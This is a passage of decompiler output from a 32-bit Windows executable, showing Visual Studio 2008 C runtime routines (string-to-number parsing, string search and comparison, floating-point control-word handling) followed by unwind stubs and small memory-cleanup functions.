      if (uVar3 == 0x2000) {
        uVar5 = uVar5 | 0x100;
      }
      else if (uVar3 == 0x4000) {
        uVar5 = uVar5 | 0x200;
      }
      else if (uVar3 == 0x6000) {
        uVar5 = uVar5 | 0x300;
      }
    }
    uVar4 = MXCSR & 0x8040;
    if (uVar4 == 0x40) {
      uVar5 = uVar5 | 0x2000000;
    }
    else if (uVar4 == 0x8000) {
      uVar5 = uVar5 | 0x3000000;
    }
    else if (uVar4 == 0x8040) {
      uVar5 = uVar5 | 0x1000000;
    }
    uVar4 = ~(_Mask & 0x308031f) & uVar5 | _Mask & 0x308031f & _NewValue;
    if (uVar4 != uVar5) {
      uVar5 = ___hw_cw_sse2(uVar3,uVar4);
      ___set_fpsr_sse2(uVar5);
      uVar5 = 0;
      if ((char)MXCSR < '\0') {
        uVar5 = 0x10;
      }
      if ((MXCSR & 0x200) != 0) {
        uVar5 = uVar5 | 8;
      }
      if ((MXCSR & 0x400) != 0) {
        uVar5 = uVar5 | 4;
      }
      if ((MXCSR & 0x800) != 0) {
        uVar5 = uVar5 | 2;
      }
      if ((MXCSR & 0x1000) != 0) {
        uVar5 = uVar5 | 1;
      }
      if ((MXCSR & 0x100) != 0) {
        uVar5 = uVar5 | 0x80000;
      }
      uVar3 = MXCSR & 0x6000;
      if (uVar3 != 0) {
        if (uVar3 == 0x2000) {
          uVar5 = uVar5 | 0x100;
        }
        else if (uVar3 == 0x4000) {
          uVar5 = uVar5 | 0x200;
        }
        else if (uVar3 == 0x6000) {
          uVar5 = uVar5 | 0x300;
        }
      }
      uVar3 = MXCSR & 0x8040;
      if (uVar3 == 0x40) {
        uVar5 = uVar5 | 0x2000000;
      }
      else if (uVar3 == 0x8000) {
        uVar5 = uVar5 | 0x3000000;
      }
      else if (uVar3 == 0x8040) {
        uVar5 = uVar5 | 0x1000000;
      }
    }
    uVar3 = uVar5 ^ uVar2;
    uVar2 = uVar5 | uVar2;
    if ((uVar3 & 0x8031f) != 0) {
      uVar2 = uVar2 | 0x80000000;
    }
  }
  return uVar2;
}



// Library Function - Single Match
//  unsigned long __cdecl strtoxl(struct localeinfo_struct *,char const *,char const * *,int,int)
// 
// Library: Visual Studio 2008 Release

ulong __cdecl
strtoxl(localeinfo_struct *param_1,char *param_2,char **param_3,int param_4,int param_5)

{
  ushort uVar1;
  byte *pbVar2;
  int *piVar3;
  uint uVar4;
  pthreadlocinfo ptVar5;
  uint uVar6;
  int iVar7;
  byte bVar8;
  byte *pbVar9;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ulong local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,param_1);
  if (param_3 != (char **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (char *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  bVar8 = *param_2;
  local_8 = 0;
  ptVar5 = local_18.locinfo;
  pbVar2 = (byte *)param_2;
  while( true ) {
    pbVar9 = pbVar2 + 1;
    if ((int)ptVar5->locale_name[3] < 2) {
      uVar4 = *(ushort *)(ptVar5[1].lc_category[0].locale + (uint)bVar8 * 2) & 8;
    }
    else {
      uVar4 = __isctype_l((uint)bVar8,8,&local_18);
      ptVar5 = local_18.locinfo;
    }
    if (uVar4 == 0) break;
    bVar8 = *pbVar9;
    pbVar2 = pbVar9;
  }
  if (bVar8 == 0x2d) {
    param_5 = param_5 | 2;
LAB_004217c0:
    bVar8 = *pbVar9;
    pbVar9 = pbVar2 + 2;
  }
  else if (bVar8 == 0x2b) goto LAB_004217c0;
  if (((param_4 < 0) || (param_4 == 1)) || (0x24 < param_4)) {
    if (param_3 != (char **)0x0) {
      *param_3 = param_2;
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  if (param_4 == 0) {
    if (bVar8 != 0x30) {
      param_4 = 10;
      goto LAB_00421826;
    }
    if ((*pbVar9 != 0x78) && (*pbVar9 != 0x58)) {
      param_4 = 8;
      goto LAB_00421826;
    }
    param_4 = 0x10;
  }
  else if ((param_4 != 0x10) || (bVar8 != 0x30)) goto LAB_00421826;
  if ((*pbVar9 == 0x78) || (*pbVar9 == 0x58)) {
    bVar8 = pbVar9[1];
    pbVar9 = pbVar9 + 2;
  }
LAB_00421826:
  uVar4 = (uint)(0xffffffff / (ulonglong)(uint)param_4);
  do {
    uVar1 = *(ushort *)(ptVar5[1].lc_category[0].locale + (uint)bVar8 * 2);
    if ((uVar1 & 4) == 0) {
      if ((uVar1 & 0x103) == 0) {
LAB_00421883:
        pbVar9 = pbVar9 + -1;
        if ((param_5 & 8U) == 0) {
          if (param_3 != (char **)0x0) {
            pbVar9 = (byte *)param_2;
          }
          local_8 = 0;
        }
        else if (((param_5 & 4U) != 0) ||
                (((param_5 & 1U) == 0 &&
                 ((((param_5 & 2U) != 0 && (0x80000000 < local_8)) ||
                  (((param_5 & 2U) == 0 && (0x7fffffff < local_8)))))))) {
          piVar3 = __errno();
          *piVar3 = 0x22;
          if ((param_5 & 1U) == 0) {
            local_8 = ((param_5 & 2U) != 0) + 0x7fffffff;
          }
          else {
            local_8 = 0xffffffff;
          }
        }
        if (param_3 != (char **)0x0) {
          *param_3 = (char *)pbVar9;
        }
        if ((param_5 & 2U) != 0) {
          local_8 = -local_8;
        }
        if (local_c == '\0') {
          return local_8;
        }
        *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
        return local_8;
      }
      iVar7 = (int)(char)bVar8;
      if ((byte)(bVar8 + 0x9f) < 0x1a) {
        iVar7 = iVar7 + -0x20;
      }
      uVar6 = iVar7 - 0x37;
    }
    else {
      uVar6 = (int)(char)bVar8 - 0x30;
    }
    if ((uint)param_4 <= uVar6) goto LAB_00421883;
    if ((local_8 < uVar4) ||
       ((local_8 == uVar4 && (uVar6 <= (uint)(0xffffffff % (ulonglong)(uint)param_4))))) {
      local_8 = local_8 * param_4 + uVar6;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (char **)0x0) goto LAB_00421883;
    }
    bVar8 = *pbVar9;
    pbVar9 = pbVar9 + 1;
  } while( true );
}



// Library Function - Single Match
//  _strtol
// 
// Library: Visual Studio 2008 Release

long __cdecl _strtol(char *_Str,char **_EndPtr,int _Radix)

{
  ulong uVar1;
  undefined **ppuVar2;
  
  if (DAT_0042d8b8 == 0) {
    ppuVar2 = &PTR_DAT_0042bdf0;
  }
  else {
    ppuVar2 = (undefined **)0x0;
  }
  uVar1 = strtoxl((localeinfo_struct *)ppuVar2,_Str,_EndPtr,_Radix,0);
  return uVar1;
}



// Library Function - Single Match
//  __strdup
// 
// Library: Visual Studio 2008 Release

char * __cdecl __strdup(char *_Src)

{
  char *_Dst;
  size_t sVar1;
  errno_t eVar2;
  
  if (_Src == (char *)0x0) {
    _Dst = (char *)0x0;
  }
  else {
    sVar1 = _strlen(_Src);
    _Dst = (char *)_malloc(sVar1 + 1);
    if (_Dst == (char *)0x0) {
      _Dst = (char *)0x0;
    }
    else {
      eVar2 = _strcpy_s(_Dst,sVar1 + 1,_Src);
      if (eVar2 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
    }
  }
  return _Dst;
}



// Library Function - Single Match
//  __mbschr_l
// 
// Library: Visual Studio 2008 Release

uchar * __cdecl __mbschr_l(uchar *_Str,uint _Ch,_locale_t _Locale)

{
  byte bVar1;
  byte bVar2;
  int *piVar3;
  byte *pbVar4;
  _LocaleUpdate local_14 [4];
  int local_10;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_14,_Locale);
  if (_Str == (uchar *)0x0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    _Str = (byte *)0x0;
  }
  else {
    if (*(int *)(local_10 + 8) == 0) {
      _Str = (uchar *)_strchr((char *)_Str,_Ch);
    }
    else {
      while( true ) {
        bVar2 = *_Str;
        if (bVar2 == 0) break;
        if ((*(byte *)(bVar2 + 0x1d + local_10) & 4) == 0) {
          pbVar4 = _Str;
          if (_Ch == bVar2) break;
        }
        else {
          bVar1 = _Str[1];
          if (bVar1 == 0) goto LAB_00421a60;
          pbVar4 = _Str + 1;
          if (_Ch == CONCAT11(bVar2,bVar1)) goto LAB_00421a52;
        }
        _Str = pbVar4 + 1;
      }
      if (_Ch != (ushort)bVar2) {
LAB_00421a60:
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return (uchar *)0x0;
      }
    }
LAB_00421a52:
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  return _Str;
}



// Library Function - Single Match
//  __mbschr
// 
// Library: Visual Studio 2008 Release

uchar * __cdecl __mbschr(uchar *_Str,uint _Ch)

{
  uchar *puVar1;
  
  puVar1 = __mbschr_l(_Str,_Ch,(_locale_t)0x0);
  return puVar1;
}



// Library Function - Single Match
//  ___ascii_strnicmp
// 
// Library: Visual Studio 2008 Release

int __cdecl ___ascii_strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  char cVar1;
  byte bVar2;
  ushort uVar3;
  uint uVar4;
  bool bVar5;
  
  if (_MaxCount != 0) {
    do {
      bVar2 = *_Str1;
      cVar1 = *_Str2;
      uVar3 = CONCAT11(bVar2,cVar1);
      if (bVar2 == 0) break;
      uVar3 = CONCAT11(bVar2,cVar1);
      uVar4 = (uint)uVar3;
      if (cVar1 == '\0') break;
      _Str1 = (char *)((byte *)_Str1 + 1);
      _Str2 = _Str2 + 1;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar4 = (uint)CONCAT11(bVar2 + 0x20,cVar1);
      }
      uVar3 = (ushort)uVar4;
      bVar2 = (byte)uVar4;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar3 = (ushort)CONCAT31((int3)(uVar4 >> 8),bVar2 + 0x20);
      }
      bVar2 = (byte)(uVar3 >> 8);
      bVar5 = bVar2 < (byte)uVar3;
      if (bVar2 != (byte)uVar3) goto LAB_00421ae1;
      _MaxCount = _MaxCount - 1;
    } while (_MaxCount != 0);
    _MaxCount = 0;
    bVar2 = (byte)(uVar3 >> 8);
    bVar5 = bVar2 < (byte)uVar3;
    if (bVar2 != (byte)uVar3) {
LAB_00421ae1:
      _MaxCount = 0xffffffff;
      if (!bVar5) {
        _MaxCount = 1;
      }
    }
  }
  return _MaxCount;
}



// Library Function - Single Match
//  ___mtold12
// 
// Library: Visual Studio 2008 Release

void __cdecl ___mtold12(char *param_1,int param_2,uint *param_3)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  bool bVar4;
  bool bVar5;
  short sVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  
  uVar7 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  sVar6 = 0x404e;
  *param_3 = 0;
  param_3[1] = 0;
  param_3[2] = 0;
  if (param_2 != 0) {
    do {
      uVar2 = *param_3;
      uVar10 = *param_3;
      uVar1 = param_3[1];
      uVar11 = param_3[2];
      uVar9 = param_3[1] * 2;
      bVar4 = false;
      uVar8 = (param_3[2] * 2 | param_3[1] >> 0x1f) * 2 | uVar9 >> 0x1f;
      uVar3 = uVar2 * 4;
      uVar9 = (uVar9 | uVar2 >> 0x1f) * 2 | uVar2 * 2 >> 0x1f;
      uVar2 = uVar3 + uVar10;
      *param_3 = uVar3;
      param_3[1] = uVar9;
      param_3[2] = uVar8;
      if ((uVar2 < uVar3) || (uVar2 < uVar10)) {
        bVar4 = true;
      }
      bVar5 = false;
      *param_3 = uVar2;
      if (bVar4) {
        uVar10 = uVar9 + 1;
        if ((uVar10 < uVar9) || (uVar10 == 0)) {
          bVar5 = true;
        }
        param_3[1] = uVar10;
        if (bVar5) {
          param_3[2] = uVar8 + 1;
        }
      }
      uVar10 = param_3[1] + uVar1;
      bVar4 = false;
      if ((uVar10 < param_3[1]) || (uVar10 < uVar1)) {
        bVar4 = true;
      }
      param_3[1] = uVar10;
      if (bVar4) {
        param_3[2] = param_3[2] + 1;
      }
      param_3[2] = param_3[2] + uVar11;
      bVar4 = false;
      uVar1 = uVar2 * 2;
      uVar11 = uVar10 * 2 | uVar2 >> 0x1f;
      uVar10 = param_3[2] * 2 | uVar10 >> 0x1f;
      *param_3 = uVar1;
      param_3[1] = uVar11;
      param_3[2] = uVar10;
      uVar2 = uVar1 + (int)*param_1;
      if ((uVar2 < uVar1) || (uVar2 < (uint)(int)*param_1)) {
        bVar4 = true;
      }
      *param_3 = uVar2;
      if (bVar4) {
        uVar2 = uVar11 + 1;
        bVar4 = false;
        if ((uVar2 < uVar11) || (uVar2 == 0)) {
          bVar4 = true;
        }
        param_3[1] = uVar2;
        if (bVar4) {
          param_3[2] = uVar10 + 1;
        }
      }
      param_2 = param_2 + -1;
      param_1 = param_1 + 1;
    } while (param_2 != 0);
  }
  while (param_3[2] == 0) {
    param_3[2] = param_3[1] >> 0x10;
    sVar6 = sVar6 + -0x10;
    param_3[1] = param_3[1] << 0x10 | *param_3 >> 0x10;
    *param_3 = *param_3 << 0x10;
  }
  uVar2 = param_3[2];
  while ((uVar2 & 0x8000) == 0) {
    uVar10 = *param_3;
    uVar1 = param_3[1];
    sVar6 = sVar6 + -1;
    *param_3 = uVar10 * 2;
    uVar2 = param_3[2] * 2;
    param_3[1] = uVar1 * 2 | uVar10 >> 0x1f;
    param_3[2] = uVar2 | uVar1 >> 0x1f;
  }
  *(short *)((int)param_3 + 10) = sVar6;
  ___security_check_cookie_4(uVar7 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___set_fpsr_sse2
// 
// Library: Visual Studio 2008 Release

void __cdecl ___set_fpsr_sse2(uint param_1)

{
  if (DAT_0046ec40 != 0) {
    if (((param_1 & 0x40) == 0) || (DAT_0042c3d4 == 0)) {
      MXCSR = param_1 & 0xffffffbf;
    }
    else {
      MXCSR = param_1;
    }
  }
  return;
}



// Library Function - Single Match
//  _strchr
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

char * __cdecl _strchr(char *_Str,int _Val)

{
  uint uVar1;
  char cVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;
  
  uVar1 = (uint)_Str & 3;
  while (uVar1 != 0) {
    if (*_Str == (char)_Val) {
      return (char *)(uint *)_Str;
    }
    if (*_Str == '\0') {
      return (char *)0x0;
    }
    uVar1 = (uint)(uint *)((int)_Str + 1) & 3;
    _Str = (char *)(uint *)((int)_Str + 1);
  }
  while( true ) {
    while( true ) {
      uVar1 = *(uint *)_Str;
      uVar4 = uVar1 ^ CONCAT22(CONCAT11((char)_Val,(char)_Val),CONCAT11((char)_Val,(char)_Val));
      uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;
      puVar5 = (uint *)((int)_Str + 4);
      if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;
      _Str = (char *)puVar5;
      if ((uVar3 & 0x81010100) != 0) {
        if ((uVar3 & 0x1010100) != 0) {
          return (char *)0x0;
        }
        if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {
          return (char *)0x0;
        }
      }
    }
    uVar1 = *(uint *)_Str;
    if ((char)uVar1 == (char)_Val) {
      return (char *)(uint *)_Str;
    }
    if ((char)uVar1 == '\0') {
      return (char *)0x0;
    }
    cVar2 = (char)(uVar1 >> 8);
    if (cVar2 == (char)_Val) {
      return (char *)((int)_Str + 1);
    }
    if (cVar2 == '\0') break;
    cVar2 = (char)(uVar1 >> 0x10);
    if (cVar2 == (char)_Val) {
      return (char *)((int)_Str + 2);
    }
    if (cVar2 == '\0') {
      return (char *)0x0;
    }
    cVar2 = (char)(uVar1 >> 0x18);
    if (cVar2 == (char)_Val) {
      return (char *)((int)_Str + 3);
    }
    _Str = (char *)puVar5;
    if (cVar2 == '\0') {
      return (char *)0x0;
    }
  }
  return (char *)0x0;
}



void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x00421e0e. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}



void Unwind_00421e20(void)

{
  int unaff_EBP;
  
  FUN_004092a6((undefined4 *)(unaff_EBP + -0x60));
  return;
}



void Unwind_00421e28(void)

{
  int unaff_EBP;
  
  FUN_00408976(unaff_EBP + -0x9c);
  return;
}



void Unwind_00421e80(void)

{
  FUN_00403930();
  return;
}



void Unwind_00421eb0(void)

{
  int unaff_EBP;
  
  FUN_0040fb79(*(void **)(unaff_EBP + -0x10));
  return;
}



void FUN_00422090(void)

{
  if (DAT_0044e290 != (void *)0x0) {
    _free(DAT_0044e290);
  }
  return;
}



void FUN_004220b0(void)

{
  return;
}



void FUN_004220c0(void)

{
  if (DAT_0044e2a8 != (void *)0x0) {
    _free(DAT_0044e2a8);
    DAT_0044e2a8 = (void *)0x0;
  }
  return;
}



void FUN_004220e0(void)

{
  if (DAT_0044e2b0 != (void *)0x0) {
    _free(DAT_0044e2b0);
    DAT_0044e2b0 = (void *)0x0;
  }
  return;
}



void FUN_00422100(void)

{
  return;
}



void FUN_00422101(void)

{
  ATL::CWin32Heap::~CWin32Heap((CWin32Heap *)&DAT_0042d020);
  return;
}



void FUN_0042210b(void)

{
  DAT_0042d02c = &PTR_Allocate_00424e1c;
  return;
}



void FUN_00422116(void)

{
  FUN_0040fad2(0x42d048);
  return;
}


